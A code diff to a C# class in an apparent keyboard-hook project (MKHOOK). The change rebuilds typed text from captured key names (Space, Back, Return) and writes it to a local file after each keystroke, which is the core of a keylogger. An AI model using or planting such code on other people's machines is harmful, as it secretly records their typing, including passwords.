@@ -11,6 +11,8 @@ namespace MKHOOK
     {
         private string pathString;
         private Events events;
+        private string words = "";
+        private int specialCharacters = 0;
 
         public WordsFile(Events events)
         {
@@ -20,9 +22,28 @@ namespace MKHOOK
             using (System.IO.FileStream fs = System.IO.File.Create(pathString))
             { }
         }
-        public void write()
+        public void write(string newWords)
         {
-            File.WriteAllText(pathString, events.getWords());
+            if (newWords == "Space")
+            {
+                words = words + " ";
+            } else if (newWords == "Back")
+            {
+                if (words.Length != 0)
+                    words = words.Remove(words.Length - 1, 1);
+            } else if (newWords == "Return")
+            {
+                words = words + "\r\n";
+            }
+            else if (newWords.Length > 1)
+            {
+                specialCharacters++;
+            }
+            else
+            {
+                words = words + newWords;
+            }
+            File.WriteAllText(pathString, words);
         }
     }
 }
